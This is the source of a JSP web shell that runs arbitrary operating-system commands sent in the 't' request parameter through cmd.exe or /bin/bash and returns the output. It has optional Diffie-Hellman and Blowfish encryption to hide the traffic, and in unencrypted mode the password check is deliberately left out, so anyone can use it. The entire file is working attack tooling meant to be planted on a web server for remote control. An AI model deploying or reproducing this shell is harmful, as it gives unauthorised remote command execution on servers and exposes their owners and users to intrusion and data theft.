<%--
Simple JSP shell, Simple os detection & prolly flawed encrypted commands
Author: http://diablohorn.wordpress.com
Borrowed and modified code from the following sources: 
 http://www.javaworld.com/javaworld/jw-12-2000/jw-1229-traps.html?page=4
 http://stackoverflow.com/questions/992019/java-256bit-aes-encryption
 http://java.sun.com/developer/technicalArticles/Security/AES/AES_v1.html
--%>
<%@page import="sc.SeComDH"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.security.*"%>
<%@page import="javax.crypto.*"%>
<%@page import="javax.crypto.spec.*"%>

<%
/*
 * t = command to execute(can be encrypted)
 * i = aes iv
 * e = is t encrypted or not
 * p = shell pass if no crypto is used
 * dp = diffie public key and return ours
 * s = signature
 * cmd2exec = command which will finally be executed
 */
String temp = request.getParameter("t");
String iv = request.getParameter("i");
String ce = request.getParameter("e");
String pass = request.getParameter("p");
String dp = request.getParameter("dp");
String s = request.getParameter("s");
String cmd2exec = null;
SeComDH sc = null;

/*
 * For encryption first call should be:
 * ?e=yeah&dp=<DHPUBKEY>&s=<SIGOFPUBKEY>
 * We return <OURPUBKEY;OURPUBKEYSIG>
 *
 * For encryption second call should be:
 * ?t=<ENCRYPTEDCOMMAND>&i=<IV>
 * We retun <IV><CRYPTEDRESULT>
 * 
 * Without encryption only call should be:
 * ?t=id&p=<PASSWORD>
 * We return command result
 */
//store if we need encryption
if(session.getAttribute("encryption") == null){
    if(ce == null){
        //crypto not gonna be used
        session.setAttribute("encryption", "0");
    }else{
        session.setAttribute("encryption", "1");
    }
}

//do we need encryption?
if(session.getAttribute("encryption").equals("1")){
    try{
//store if we need dh, initialize accordingly
        if (session.getAttribute("secretkey") == null) {
            if (dp == null) {
                out.println("NODHPUBKEY");
                return;
            } else {
                byte[] alicepubkey = SeComDH.asByte(dp);
                String alicepubkeysig = s;
                if(!SeComDH.verifyWithDSA(alicepubkey, SeComDH.asByte(alicepubkeysig), application.getResourceAsStream("/WEB-INF/publicalice.dsa"))){
                    out.println("SIGCHECKFAIL");
                    return;
                }
                sc = new SeComDH(alicepubkey);
                sc.bobGenerateSecret();
                session.setAttribute("secretkey", SeComDH.md5(sc.getBobSharedSecret()));
                String bobpubkey = sc.getBobPublicKey();
                byte[] bobpubkeysig = SeComDH.signWithDSA(SeComDH.asByte(bobpubkey), application.getResourceAsStream("/WEB-INF/privatebob.dsa"));
                out.println(bobpubkey+";"+SeComDH.asHex(bobpubkeysig));
                return;
            }
        }else{
            cmd2exec = SeComDH.decryptBlowfish(temp, (String)session.getAttribute("secretkey") , iv);
        }
    }catch(Exception e){
        out.println(e);
        return;
    }
}else{
    if(temp != null){
        //implement pass check
        //this is left as an excersize for the user :)
        //either remove it or implement it if you don't people will be able to abuse your shell
        cmd2exec = temp;
    }else{
        out.println("No command given and no crypto selected");
        return;
    }
}

try
{
    String osName = System.getProperty("os.name" );
    String[] cmd = new String[3];
    if( osName.toLowerCase().contains("windows"))
    {
        cmd[0] = "cmd.exe" ;
        cmd[1] = "/C" ;
        cmd[2] = cmd2exec;
    }
    else if( osName.toLowerCase().contains("linux"))
    {
        cmd[0] = "/bin/bash" ;
        cmd[1] = "-c" ;
        cmd[2] = cmd2exec;
    }else{
        cmd[0] = cmd2exec;
    }

    Runtime rt = Runtime.getRuntime();
    Process proc = rt.exec(cmd);
        try
        {
            InputStreamReader iser = new InputStreamReader(proc.getErrorStream());
            InputStreamReader isir = new InputStreamReader(proc.getInputStream());
            BufferedReader ber = new BufferedReader(iser);
            BufferedReader bir = new BufferedReader(isir);
            String errline=null;
            String inpline=null;
            
            while ( (inpline = bir.readLine()) != null){
                if(session.getAttribute("encryption").equals("1")){
                    String[] tempcrypt = SeComDH.encryptBlowfish(inpline.trim(), (String)session.getAttribute("secretkey"));
                    out.println(tempcrypt[1]+tempcrypt[0]);
                }else{
                    out.println(inpline);
                }
            }
            
            while ( (errline = ber.readLine()) != null){
                if(session.getAttribute("encryption").equals("1")){
                    String[] tempcrypt = SeComDH.encryptBlowfish(errline.trim(), (String)session.getAttribute("secretkey"));
                    out.println(tempcrypt[1]+tempcrypt[0]);
                }else{
                    out.println(errline);
                }
            }
                
        } catch (IOException ioe) {
                ioe.printStackTrace(new java.io.PrintWriter(out));
        }    
    proc.waitFor();
} catch (Exception e) {
    e.printStackTrace(new java.io.PrintWriter(out));
}
%>
